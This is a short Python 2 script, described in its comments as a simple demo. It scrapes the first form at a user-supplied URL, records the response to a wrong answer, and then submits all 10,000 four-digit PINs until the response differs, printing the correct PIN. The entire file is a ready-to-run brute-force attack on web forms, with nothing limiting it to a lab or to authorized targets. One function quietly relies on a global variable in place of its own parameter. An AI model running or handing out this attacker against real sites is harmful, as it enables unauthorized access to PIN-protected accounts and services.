#!/usr/bin/python
# -*- coding: utf-8 -*-

# This is just a demo and simple script, we will add a lot of things to it

# libraries we need
import sys, requests, itertools
from lxml.html import fromstring # foromstring is found in lxml.html

def getAllPossibilties(charset, minlength, maxlength):
	return (''.join(candidate)
			for candidate in itertools.chain.from_iterable(
				itertools.product(charset, repeat=i)
				for i in range(minlength, maxlength + 1)
			)
		)

def sendRequest(action, method, inputs):
	# check if GET or POST
	if method == "GET":
		action += "?" 
		for i in fields:
			action += i+"="+fields[i]+"&"

		with requests.Session() as c:
			response = c.get(action)
	else :
		with requests.Session() as c:
			response = c.post(action, data=fields)

	return response

if __name__ == '__main__':

	if len(sys.argv) > 1:
		# Get the form url
		url = sys.argv[1]
		print "[+] TARGET : {0}".format(url)

		# Go to the form
		with requests.Session() as c:
			response = c.get(url)

		# status_code == 200 => everything is good
		if response.status_code == 200:
			
			# we parse the html page so we collect the form info
			html = fromstring(response.content)

			# Get the form, since there is only one form so it's index is 0
			form = html.forms[0]

			# form action
			# but what if the url is already in the action, let's deal with this
			action = form.action
			if "http" not in action:
				action = url + action
 			# form method
			method = form.method

			# Gather inputs fields
			fields = dict(form.fields)

			# Send wrong question
			fields.update({
				"pin" : "wrong answer"
				})

			response = sendRequest(action, method, fields)

			# Get wrong answer
			wrongAnswer = response.content
			print "[+] WRONG ANSWER : {0}".format(wrongAnswer)

			# Get all possiable input
			# we will use a famous function to generate all inputs

			charset = "0123456789"
			minlength = 4
			maxlength = 4
			allInputs = list(getAllPossibilties(charset, minlength, maxlength))

			# start bruteforcing
			for pin in allInputs:
				# we have now to send our pinS
				fields.update({
					"pin" : pin
					})

				response = sendRequest(action, method, fields)

				# we check the answer
				if wrongAnswer in response.content:
					print "[-] wrong pin : {0}".format(pin)
				else:
					print "[+] correct pin : {0}".format(pin)
					break

		else :
			print "there is problem with the url: {0}".format(url)
	else :
		# sys.argv[0] is the name of the script
		# sys.argv[0] ===> bruteforce.py
		# sys.argv[1] ===> the first arg after the name of the script (eg: script.py argv1 argv2 ...)
		print "usage : {0} url".format(sys.argv[0])